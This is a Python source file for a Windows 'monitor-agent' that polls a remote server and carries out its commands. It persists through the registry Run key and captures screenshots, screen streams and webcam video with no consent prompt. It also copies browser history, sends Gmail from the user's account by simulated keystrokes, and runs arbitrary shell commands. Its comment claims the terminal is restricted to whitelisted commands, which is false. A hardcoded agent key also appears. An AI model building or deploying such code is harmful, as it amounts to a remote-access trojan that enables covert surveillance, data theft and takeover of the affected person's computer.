import base64
import io
import os
import shutil
import sqlite3
import subprocess
import tempfile
import time
import urllib.parse
import webbrowser
import sys
import winreg
import getpass
import platform
import uuid
import threading
from datetime import datetime, timedelta
import psutil
import json
import requests

# ===========================================================================
#  API PATH  — set this to your backend (server.js) URL before building the exe.
#  This is the ONLY thing you must change to point the agent at a hosted server.
#     local:   http://localhost:8000
#     hosted:  https://your-domain.example      (or  http://<server-ip>:8000)
# ===========================================================================
API_BASE = os.environ.get("API_BASE", "https://laptop-control.onrender.com")
APP_NAME = "monitor-agent"  # name of the agent in the Windows registry (for auto-start)
# Must match AGENT_KEY in the backend (server.js / its env).
AGENT_KEY = os.environ.get("AGENT_KEY", "fu2//i6ryxk2kvkIDUaQl+VlLekkkhRLNfj1ndpFcFo=")

# How often the agent asks the backend for a new command. Lower = snappier live
# monitoring (screen/camera streams, USB detection), at the cost of more polling.
POLL_INTERVAL = float(os.environ.get("POLL_INTERVAL", "0.5"))   # seconds

# Seconds to wait for the Gmail compose window to load before auto-sending
# (Ctrl+Enter). Increase this on slow machines / connections if mail doesn't send.
MAIL_SEND_DELAY = float(os.environ.get("MAIL_SEND_DELAY", "7"))

HEADERS = {"X-Agent-Key": AGENT_KEY}


# ===========================================================================
#  AGENT IDENTITY  — how this laptop identifies itself so the dashboard can
#  list it, show the user, and its live online status.
# ===========================================================================
def get_or_create_agent_id():
    """A stable unique id for this install, persisted in the registry."""
    key_path = r"Software\\" + APP_NAME
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path) as key:
            value, _ = winreg.QueryValueEx(key, "AgentId")
            if value:
                return value
    except FileNotFoundError:
        pass
    new_id = uuid.uuid4().hex[:12]
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
        winreg.SetValueEx(key, "AgentId", 0, winreg.REG_SZ, new_id)
    return new_id


AGENT_ID = get_or_create_agent_id()


def system_identity():
    """Who + which machine this is — used to identify the employee laptop."""
    return {
        "agent_id": AGENT_ID,
        "username": getpass.getuser(),          # the logged-in Windows user
        "hostname": platform.node(),            # the computer name
        "os": f"{platform.system()} {platform.release()}",
    }


def register_agent():
    """Tell the server who we are (called at startup and periodically)."""
    try:
        requests.post(
            f"{API_BASE}/api/agent/register",
            headers=HEADERS,
            json=system_identity(),
            timeout=15,
        )
    except Exception as e:
        print(f"register failed: {e}")


# Every poll carries our id so the server can update our live "last seen".
HEADERS["X-Agent-Id"] = AGENT_ID


# ===========================================================================
#  TOOLS  — each returns (content_type, data) where data is a string.
# ===========================================================================
def tool_screenshot():
    """1 — full-screen screenshot -> base64 PNG."""
    import pyautogui
    img = pyautogui.screenshot()
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return "image", "data:image/png;base64," + b64(buf.getvalue())

def tool_cpu():
    """2 — One CPU, RAM, Disk, and System snapshot -> JSON."""

    import json
    import platform
    import psutil
    import time
    from datetime import datetime

    uname = platform.uname()

    # Prime CPU counters
    psutil.cpu_percent(interval=None)
    time.sleep(0.3)

    per_core = psutil.cpu_percent(interval=None, percpu=True)
    total = psutil.cpu_percent(interval=None)
    freq = psutil.cpu_freq()

    # Find busiest process
    top = None
    for p in psutil.process_iter(["name", "cpu_percent"]):
        try:
            cpu = p.info["cpu_percent"] or 0
            if top is None or cpu > top[1]:
                top = (p.info["name"], cpu)
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

    # RAM Information
    ram = psutil.virtual_memory()

    # Disk Information
    disk = psutil.disk_usage("/")

    data = {
        "system_info": {
            "system": uname.system,
            "release": uname.release,
            "version": uname.version,
            "machine": uname.machine,
            "processor": uname.processor,
        },

        "cpu": {
            "physical_cores": psutil.cpu_count(logical=False),
            "logical_cores": psutil.cpu_count(logical=True),
            "total_cpu_percent": round(total, 1),
            "current_freq_mhz": round(freq.current, 1) if freq else None,
            "max_freq_mhz": round(freq.max, 1) if freq else None,
            "min_freq_mhz": round(freq.min, 1) if freq else None,
            "per_core_percent": [round(x, 1) for x in per_core],
            "busiest_process": {
                "name": top[0],
                "cpu_percent": round(top[1], 1)
            } if top else None,
        },

        "memory": {
            "total_gb": round(ram.total / (1024 ** 3), 2),
            "available_gb": round(ram.available / (1024 ** 3), 2),
            "used_gb": round(ram.used / (1024 ** 3), 2),
            "free_gb": round(ram.free / (1024 ** 3), 2),
            "percent_used": ram.percent,
        },

        "disk": {
            "total_gb": round(disk.total / (1024 ** 3), 2),
            "used_gb": round(disk.used / (1024 ** 3), 2),
            "free_gb": round(disk.free / (1024 ** 3), 2),
            "percent_used": disk.percent,
        },

        "captured_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }

    return "json", json.dumps(data)


def tool_camera():
    """3 — grab one frame from the default camera -> base64 JPEG."""
    import cv2
    cap = cv2.VideoCapture(0)
    try:
        if not cap.isOpened():
            return "text", "Error: could not access the camera."
        for _ in range(5):                       # let exposure settle
            ok, frame = cap.read()
        if not ok:
            return "text", "Error: failed to grab a frame."
        ok, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
        return "image", "data:image/jpeg;base64," + b64(buf.tobytes())
    finally:
        cap.release()

# Kept-open camera handle so live streaming doesn't reopen the device each
# frame (reopening is slow and makes the camera light flicker). A watchdog
# thread releases it a few seconds after the last frame so the camera light
# turns OFF when nobody is watching — it is only on while actively streaming.
_camera_cap = None
_camera_last_use = 0.0
_camera_lock = threading.Lock()
CAMERA_IDLE_RELEASE = float(os.environ.get("CAMERA_IDLE_RELEASE", "3"))  # seconds


def tool_camera_stream():
    """8 — one LIVE frame from a kept-open camera -> base64 JPEG.

    The live-camera page re-requests this repeatedly to form a stream. The
    capture device stays open between calls for speed, but the watchdog thread
    releases it shortly after the last request so the camera isn't left on.
    """
    import cv2
    global _camera_cap, _camera_last_use

    with _camera_lock:
        if _camera_cap is None or not _camera_cap.isOpened():
            _camera_cap = cv2.VideoCapture(0)

        if not _camera_cap.isOpened():
            _camera_cap = None
            return "text", "Error: could not access the camera."

        ok, frame = _camera_cap.read()
        if not ok:
            _camera_cap.release()
            _camera_cap = None
            return "text", "Error: failed to grab a frame."

        _camera_last_use = time.time()   # tell the watchdog we're still streaming

    ok, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
    return "image", "data:image/jpeg;base64," + b64(buf.tobytes())


def _camera_watchdog():
    """Release the camera when it's been idle, so its light turns off."""
    global _camera_cap
    while True:
        time.sleep(1)
        with _camera_lock:
            if _camera_cap is not None and (time.time() - _camera_last_use) > CAMERA_IDLE_RELEASE:
                _camera_cap.release()
                _camera_cap = None


def tool_usb():
    """7 — current removable (USB) drives as a JSON array (empty [] if none).

    Always returns a JSON array so the USB monitor page can poll this and
    detect changes: a drive appearing = plugged in, disappearing = removed.
    """
    drives = []

    for part in psutil.disk_partitions(all=False):

        if "removable" in part.opts.lower():

            info = {
                "drive": part.device,
                "mount": part.mountpoint,
                "filesystem": part.fstype or "",
            }
            try:
                usage = psutil.disk_usage(part.mountpoint)
                info["total_gb"] = round(usage.total / (1024 ** 3), 2)
                info["used_gb"] = round(usage.used / (1024 ** 3), 2)
            except Exception:
                pass
            drives.append(info)

    return "json", json.dumps(drives)

def tool_history():
    """4 — recent browser history (Chrome/Edge/Brave) -> JSON list."""
    import json

    local = os.environ.get("LOCALAPPDATA", "")
    browsers = {
        "Chrome": os.path.join(local, r"Google\Chrome\User Data\Default\History"),
        "Edge":   os.path.join(local, r"Microsoft\Edge\User Data\Default\History"),
        "Brave":  os.path.join(local, r"BraveSoftware\Brave-Browser\User Data\Default\History"),
    }
    epoch = datetime(1601, 1, 1)
    rows = []
    for name, path in browsers.items():
        if not os.path.exists(path):
            continue
        tmp = os.path.join(tempfile.gettempdir(), f"{name}_history_copy")
        try:
            shutil.copy2(path, tmp)               # DB is locked while browser runs
            con = sqlite3.connect(tmp)
            cur = con.cursor()
            cur.execute(
                "SELECT url, title, last_visit_time FROM urls "
                "ORDER BY last_visit_time DESC LIMIT 20"
            )
            for url, title, visit in cur.fetchall():
                when = (epoch + timedelta(microseconds=visit)).strftime("%Y-%m-%d %H:%M:%S") if visit else ""
                rows.append({"browser": name, "time": when, "title": title or "(no title)", "url": url})
            con.close()
        except Exception as e:
            rows.append({"browser": name, "time": "", "title": f"(error: {e})", "url": ""})
        finally:
            try:
                os.remove(tmp)
            except OSError:
                pass
    if not rows:
        return "text", "No browser history found (or all browsers locked)."
    return "json", json.dumps(rows)


# Common Chrome install locations on Windows (first one found is used).
CHROME_PATHS = [
    r"C:\Program Files\Google\Chrome\Application\chrome.exe",
    r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
    os.path.join(os.environ.get("LOCALAPPDATA", ""), r"Google\Chrome\Application\chrome.exe"),
]


def tool_email(payload):
    """5 — open a prefilled Gmail compose window and auto-send it.

    Uses the signed-in Gmail account in the browser (no SMTP / app password):
    opens compose via URL, waits MAIL_SEND_DELAY for it to load, then sends with
    Gmail's Ctrl+Enter shortcut. Requires a graphical session (the exe must run
    on a logged-in desktop, not headless).
    """
    import pyautogui

    payload = payload or {}
    to = payload.get("to")
    subject = payload.get("subject") or ""
    body = payload.get("body") or ""
    if not to:
        return "text", "No recipient provided."

    gmail_url = (
        "https://mail.google.com/mail/?view=cm&fs=1"
        f"&to={urllib.parse.quote(to)}"
        f"&su={urllib.parse.quote(subject)}"
        f"&body={urllib.parse.quote(body)}"
    )

    try:
        chrome = next((p for p in CHROME_PATHS if p and os.path.exists(p)), None)
        if chrome:
            subprocess.Popen([chrome, gmail_url])
        else:
            webbrowser.open(gmail_url)          # fall back to the default browser

        # Wait for the compose window to render, then send (Ctrl+Enter).
        time.sleep(MAIL_SEND_DELAY)
        pyautogui.hotkey("ctrl", "enter")
        return "text", f"Email sent to {to} (via Gmail compose)."
    except Exception as e:
        return "text", f"Could not send email: {e}"


def tool_screen():
    """6 — one screen frame -> base64 JPEG (the browser re-requests to 'stream')."""
    import cv2
    import numpy as np
    import mss

    with mss.mss() as sct:
        monitor = sct.monitors[1]
        img = np.array(sct.grab(monitor))
        img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
        ok, buf = cv2.imencode(".jpg", img, [cv2.IMWRITE_JPEG_QUALITY, 60])
    return "image", "data:image/jpeg;base64," + b64(buf.tobytes())


# ---------------------------------------------------------------------------
#  Safe terminal (tool 9) — run ONE whitelisted command for monitoring.
#  Only the commands below are permitted; anything else is refused. This keeps
#  the terminal read-only / diagnostic and prevents destructive actions.
# ---------------------------------------------------------------------------

# Persistent working directory (the agent process stays alive between polls,
# so `cd` carries over from one command to the next). We also remember the
# last directory on each drive, so switching C: <-> D: behaves like real cmd.
_terminal_cwd = os.path.expanduser("~")
_drive_cwd = {os.path.splitdrive(_terminal_cwd)[0].upper(): _terminal_cwd}


def _set_terminal_cwd(path):
    """Move to a directory and remember it as this drive's current folder."""
    global _terminal_cwd
    _terminal_cwd = path
    drive = os.path.splitdrive(path)[0].upper()   # e.g. "C:"
    if drive:
        _drive_cwd[drive] = path


def _switch_drive(letter):
    """Switch to another drive (e.g. 'D:'), like typing `D:` in cmd."""
    drive = letter.upper()
    if not drive.endswith(":"):
        drive += ":"
    root = drive + "\\"
    if not os.path.isdir(root):
        return f"The system cannot find the drive {drive}"
    target = _drive_cwd.get(drive, root)          # go back to where we were on that drive
    if not os.path.isdir(target):
        target = root
    _set_terminal_cwd(target)
    return f"{_terminal_cwd}>"


def tool_safe_terminal(payload):
    """9 — run one shell command and return its output as text."""
    import re
    payload = payload or {}
    command = (payload.get("command") or "").strip()
    if not command:
        return "text", "No command provided."

    low = command.lower()

    # `cls` — nothing to clear in a one-shot result; just echo a blank line.
    if low == "cls":
        return "text", ""

    # Bare drive letter, e.g. `D:` or `d:` -> switch to that drive.
    if re.fullmatch(r"[a-zA-Z]:", command):
        return "text", _switch_drive(command)

    # `cd` — change the persistent working directory (and drive).
    if low == "cd" or low.startswith("cd "):
        parts = command.split(maxsplit=1)
        if len(parts) == 1:
            return "text", _terminal_cwd
        arg = parts[1].strip()
        # allow the /d flag used to change drive + dir at once: `cd /d D:\path`
        if arg[:2].lower() == "/d":
            arg = arg[2:].strip()
        target = arg.strip('"')

        # `cd D:` (drive only) -> switch drive
        if re.fullmatch(r"[a-zA-Z]:", target):
            return "text", _switch_drive(target)

        if os.path.isabs(target):                 # full path incl. drive, e.g. D:\folder
            path = target
        elif re.match(r"^[a-zA-Z]:", target):     # drive-relative, e.g. D:folder
            d = target[:2].upper()
            base = _drive_cwd.get(d, d + "\\")
            path = os.path.join(base, target[2:])
        else:                                     # relative to current dir
            path = os.path.join(_terminal_cwd, target)

        path = os.path.normpath(path)
        if os.path.isdir(path):
            _set_terminal_cwd(path)
            return "text", f"{_terminal_cwd}>"
        return "text", f"The system cannot find the path specified: {target}"

    # Run it (30s cap) inside the persistent working directory.
    try:
        result = subprocess.run(
            ["cmd", "/c", command],
            cwd=_terminal_cwd,
            capture_output=True,
            text=True,
            timeout=30,
        )
        out = result.stdout + (("\n" + result.stderr) if result.stderr else "")
        header = f"{_terminal_cwd}> {command}\n"
        return "text", header + (out if out.strip() else "(no output)")
    except subprocess.TimeoutExpired:
        return "text", "Command timed out (30s limit)."
    except Exception as e:
        return "text", f"Error: {e}"


# ===========================================================================
#  LIVE VIDEO over WebRTC (tool 10) — real-time, low-latency camera stream.
#  aiortc runs its own asyncio loop in a background thread so the peer
#  connection keeps sending video AFTER the tool returns, until the viewer
#  disconnects. SDP offer/answer signaling is relayed through the normal
#  command/result queue, so no extra ports are needed. One shared camera is
#  fanned out to all viewers via a MediaRelay, and released when nobody's left.
# ===========================================================================
_webrtc_loop = None
_webrtc_pcs = set()
_webrtc_relay = None
_webrtc_cam_track = None


def _webrtc_get_loop():
    global _webrtc_loop
    if _webrtc_loop is None:
        import asyncio
        _webrtc_loop = asyncio.new_event_loop()
        threading.Thread(target=_webrtc_loop.run_forever, daemon=True).start()
    return _webrtc_loop


def _make_camera_track():
    """A VideoStreamTrack that pulls frames from the webcam via OpenCV."""
    import cv2
    import numpy as np
    from av import VideoFrame
    from aiortc import VideoStreamTrack

    class CameraTrack(VideoStreamTrack):
        def __init__(self):
            super().__init__()
            self.cap = cv2.VideoCapture(0)

        async def recv(self):
            pts, time_base = await self.next_timestamp()
            ok, frame = self.cap.read()
            if not ok:
                frame = np.zeros((480, 640, 3), dtype=np.uint8)
            vf = VideoFrame.from_ndarray(frame, format="bgr24")
            vf.pts = pts
            vf.time_base = time_base
            return vf

        def stop(self):
            super().stop()
            try:
                self.cap.release()
            except Exception:
                pass

    return CameraTrack()


def _ask_user_consent(kind="microphone and speaker"):
    """Native Yes/No dialog on the EMPLOYEE's screen. True only if they allow.

    Audio is never captured without this explicit consent — the employee must
    click "Yes" on their own machine before the mic/speaker turn on.
    """
    import ctypes
    import threading

    state = {"ok": False}
    done = threading.Event()

    def show():
        MB_YESNO = 0x4
        MB_ICONQUESTION = 0x20
        MB_TOPMOST = 0x40000
        MB_SETFOREGROUND = 0x10000
        try:
            r = ctypes.windll.user32.MessageBoxW(
                0,
                f"A monitoring session wants to turn on your {kind} for a live "
                f"call.\n\nDo you allow it?",
                "Microphone / Speaker Permission",
                MB_YESNO | MB_ICONQUESTION | MB_TOPMOST | MB_SETFOREGROUND,
            )
            state["ok"] = (r == 6)   # 6 == IDYES
        finally:
            done.set()

    threading.Thread(target=show, daemon=True).start()
    done.wait(timeout=30)            # no answer within 30s -> treated as "deny"
    return state["ok"]


def _make_mic_track():
    """An audio track that captures the employee microphone (48 kHz mono)."""
    import queue
    import asyncio
    import numpy as np
    import sounddevice as sd
    from av import AudioFrame
    from fractions import Fraction
    from aiortc.mediastreams import MediaStreamTrack

    class MicTrack(MediaStreamTrack):
        kind = "audio"

        def __init__(self):
            super().__init__()
            self.sample_rate = 48000
            self.samples = 960                    # 20 ms frames
            self._pts = 0
            self._q = queue.Queue(maxsize=50)
            self._stream = sd.InputStream(
                samplerate=self.sample_rate, channels=1, dtype="int16",
                blocksize=self.samples, callback=self._cb,
            )
            self._stream.start()

        def _cb(self, indata, frames, time_info, status):
            try:
                self._q.put_nowait(indata.copy().tobytes())
            except queue.Full:
                pass

        async def recv(self):
            data = await asyncio.get_event_loop().run_in_executor(None, self._q.get)
            arr = np.frombuffer(data, dtype="int16").reshape(1, -1)
            frame = AudioFrame.from_ndarray(arr, format="s16", layout="mono")
            frame.sample_rate = self.sample_rate
            frame.pts = self._pts
            frame.time_base = Fraction(1, self.sample_rate)
            self._pts += arr.shape[1]
            return frame

        def stop(self):
            super().stop()
            try:
                self._stream.stop(); self._stream.close()
            except Exception:
                pass

    return MicTrack()


async def _play_remote_audio(track):
    """Play the admin's incoming voice on the employee's speaker."""
    import sounddevice as sd
    from av.audio.resampler import AudioResampler

    out = sd.OutputStream(samplerate=48000, channels=1, dtype="int16")
    out.start()
    resampler = AudioResampler(format="s16", layout="mono", rate=48000)
    try:
        while True:
            frame = await track.recv()
            for f in resampler.resample(frame):
                out.write(f.to_ndarray().reshape(-1, 1).astype("int16"))
    except Exception:
        pass
    finally:
        try:
            out.stop(); out.close()
        except Exception:
            pass


async def _webrtc_handle_offer(offer_sdp, offer_type, want_audio=False):
    import asyncio
    from aiortc import (
        RTCPeerConnection, RTCSessionDescription, RTCConfiguration, RTCIceServer,
    )
    from aiortc.contrib.media import MediaRelay
    global _webrtc_relay, _webrtc_cam_track

    config = RTCConfiguration(iceServers=[RTCIceServer(urls=["stun:stun.l.google.com:19302"])])
    pc = RTCPeerConnection(configuration=config)
    _webrtc_pcs.add(pc)

    # video: one shared camera, fanned out to every viewer
    if _webrtc_cam_track is None:
        _webrtc_cam_track = _make_camera_track()
        _webrtc_relay = MediaRelay()
    pc.addTrack(_webrtc_relay.subscribe(_webrtc_cam_track))

    # audio: ONLY after the employee grants permission on their own screen
    audio_ok = False
    mic_track = None
    if want_audio:
        audio_ok = await asyncio.get_event_loop().run_in_executor(None, _ask_user_consent)
        if audio_ok:
            try:
                mic_track = _make_mic_track()        # employee mic -> admin
                pc.addTrack(mic_track)
            except Exception as e:
                print(f"mic error: {e}")

    @pc.on("track")
    def _on_track(track):
        # admin's voice -> employee speaker (only if they consented)
        if track.kind == "audio" and audio_ok:
            asyncio.ensure_future(_play_remote_audio(track))

    @pc.on("connectionstatechange")
    async def _on_state():
        global _webrtc_cam_track, _webrtc_relay
        if pc.connectionState in ("failed", "closed", "disconnected"):
            if mic_track is not None:
                mic_track.stop()
            await pc.close()
            _webrtc_pcs.discard(pc)
            if not _webrtc_pcs and _webrtc_cam_track is not None:
                _webrtc_cam_track.stop()          # release camera -> light off
                _webrtc_cam_track = None
                _webrtc_relay = None

    await pc.setRemoteDescription(RTCSessionDescription(sdp=offer_sdp, type=offer_type))
    answer = await pc.createAnswer()
    await pc.setLocalDescription(answer)

    # non-trickle ICE: wait until candidates are gathered so they're in the SDP
    for _ in range(80):
        if pc.iceGatheringState == "complete":
            break
        await asyncio.sleep(0.05)

    return {"sdp": pc.localDescription.sdp, "type": pc.localDescription.type}


def tool_camera_webrtc(payload):
    """10 — accept a WebRTC SDP offer, return an SDP answer; video then flows P2P."""
    import asyncio
    import json

    payload = payload or {}
    offer = payload.get("offer") or payload
    sdp = offer.get("sdp")
    typ = offer.get("type") or "offer"
    want_audio = bool(payload.get("audio"))       # browser asked for mic/speaker
    if not sdp:
        return "text", "No SDP offer provided."

    try:
        import aiortc  # noqa: F401 — fail clearly if the agent lacks the deps
    except Exception:
        return "text", "WebRTC not available: run `pip install aiortc av` on the agent."

    try:
        loop = _webrtc_get_loop()
        fut = asyncio.run_coroutine_threadsafe(
            _webrtc_handle_offer(sdp, typ, want_audio), loop)
        answer = fut.result(timeout=45)           # extra time for the consent dialog
        return "json", json.dumps(answer)
    except Exception as e:
        return "text", f"WebRTC error: {e}"


DISPATCH = {
    1: lambda payload: tool_screenshot(),
    2: lambda payload: tool_cpu(),
    3: lambda payload: tool_camera(),
    4: lambda payload: tool_history(),
    5: lambda payload: tool_email(payload),
    6: lambda payload: tool_screen(),
    7: lambda payload: tool_usb(),
    8: lambda payload: tool_camera_stream(),
    9: lambda payload: tool_safe_terminal(payload),
    10: lambda payload: tool_camera_webrtc(payload),
}


# ===========================================================================
#  HELPERS
# ===========================================================================
def b64(raw_bytes):
    return base64.b64encode(raw_bytes).decode("ascii")


def post_result(command_id, content_type, data):
    requests.post(
        f"{API_BASE}/api/result",
        headers=HEADERS,
        json={"command_id": command_id, "content_type": content_type, "data": data},
        timeout=30,
    )


def get_program_path():
    if getattr(sys, "frozen", False):
        return sys.executable
    return os.path.abspath(__file__)

def is_registered():
    try:
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run"
        ) as key:

            value, _ = winreg.QueryValueEx(key, APP_NAME)
            return value == get_program_path()

    except FileNotFoundError:
        return False

def register_startup():
    with winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0,
        winreg.KEY_SET_VALUE
    ) as key:

        winreg.SetValueEx(
            key,
            APP_NAME,
            0,
            winreg.REG_SZ,
            get_program_path()
        )
# ===========================================================================
#  MAIN POLL LOOP
# ===========================================================================
def main():
    print(f"Agent started. Polling {API_BASE} every {POLL_INTERVAL}s. Ctrl+C to stop.")
    print("Application Started")

    if not is_registered():
        register_startup()
        print("Startup Enabled")
    else:
        print("Already Registered")

    # Release the camera when idle so its light isn't left on.
    threading.Thread(target=_camera_watchdog, daemon=True).start()

    # Identify this laptop to the server (user, hostname, OS) for the dashboard.
    ident = system_identity()
    print(f"Identity: {ident['username']}@{ident['hostname']} (id {AGENT_ID})")
    register_agent()
    reregister_every = max(1, int(30 / POLL_INTERVAL))  # refresh identity ~every 30s
    tick = 0

    print("Running Main Program...")
    while True:
        tick += 1
        if tick % reregister_every == 0:
            register_agent()
        try:
            resp = requests.get(f"{API_BASE}/api/command/next", headers=HEADERS, timeout=15)
            if resp.status_code == 401:
                print("Rejected: agent key mismatch. Check AGENT_KEY.")
                time.sleep(5)
                continue
            command = resp.json().get("command")
        except Exception as e:
            print(f"Poll error: {e}")
            time.sleep(POLL_INTERVAL)
            continue

        if not command:
            time.sleep(POLL_INTERVAL)
            continue

        cmd_id, tool_no, payload = command["id"], command["tool_no"], command.get("payload")
        print(f"Running tool {tool_no} (command {cmd_id})...")
        try:
            content_type, data = DISPATCH[tool_no](payload)
        except Exception as e:
            content_type, data = "text", f"Tool {tool_no} failed: {e}"
        try:
            post_result(cmd_id, content_type, data)
            print(f"  -> result posted ({content_type}).")
        except Exception as e:
            print(f"  -> failed to post result: {e}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nAgent stopped.")
        
